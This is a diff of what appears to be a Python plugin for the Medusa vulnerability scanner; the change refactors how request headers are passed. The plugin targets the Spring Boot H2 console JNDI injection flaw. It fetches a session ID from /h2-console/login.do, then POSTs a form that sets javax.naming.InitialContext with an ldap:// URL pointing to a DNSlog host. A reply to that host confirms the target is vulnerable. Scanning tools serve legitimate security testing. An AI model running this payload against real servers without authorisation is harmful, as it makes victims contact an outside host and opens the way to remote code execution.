@@ -24,7 +24,7 @@ class VulnerabilityInfo(object):
         self.info['details'] = Medusa  # 结果
 
 
-def medusa(Url:str,RandomAgent:str,proxies:str=None,**kwargs)->None:
+def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
     proxies=Proxies().result(proxies)
     scheme, url, port = UrlProcessing().result(Url)
     if port is None and scheme == 'https':
@@ -34,14 +34,10 @@ def medusa(Url:str,RandomAgent:str,proxies:str=None,**kwargs)->None:
     else:
         port = port
     try:
-        headers = {
-            'User-Agent': RandomAgent,
-            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
-            "Accept-Encoding": "gzip, deflate",
-        }
+
         payload ="/h2-console/login.do?jsessionid="
         payload_url = scheme + "://" + url + ":" + str(port) + payload+"ad3ae393781ccf8d7abf0345aa88e398"
-        jsession = requests.get(payload_url, timeout=5,proxies=proxies, verify=False, headers=headers, )
+        jsession = requests.get(payload_url, timeout=5,proxies=proxies, verify=False, headers=Headers, )
         global pgroups
         preg = re.compile(r"login\.jsp\?jsessionid=(.*?)'", re.S)
         pgroups = re.findall(preg, jsession.text)
@@ -51,16 +47,13 @@ def medusa(Url:str,RandomAgent:str,proxies:str=None,**kwargs)->None:
 
         payload_url2 = scheme + "://" + url + ":" + str(port) + payload +pgroups[0]
 
-        headers2 = {
-            'User-Agent': RandomAgent,
-            'Content-Type': 'application/x-www-form-urlencoded',
-            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
-            "Accept-Encoding": "gzip, deflate",
-            'Referer': payload_url2,
-        }
+        Headers2=Headers
+        Headers2['Content-Type']='application/x-www-form-urlencoded'
+        Headers2['Referer']=payload_url2
+
         DL=Dnslog()
         data= "language=en&setting=Generic+JNDI+Data+Source&name=Generic+JNDI+Data+Source&driver=javax.naming.InitialContext&url=ldap%3A%2F%2F{}%2FExploit&user=&password=".format(DL.dns_host())
-        resp = requests.post(payload_url2,data=data,headers=headers2, proxies=proxies, timeout=6, verify=False)
+        resp = requests.post(payload_url2,data=data,headers=Headers2, proxies=proxies, timeout=6, verify=False)
         time.sleep(4)
         if DL.result():
             Medusa = "{}存在SpringBootH2数据库JNDI注入漏洞\r\n验证数据:\r\n返回内容:{}\r\nDnsLog:{}\r\nDnsLog数据:{}\r\n".format(url,resp.text,DL.dns_host(),str(DL.dns_text()))
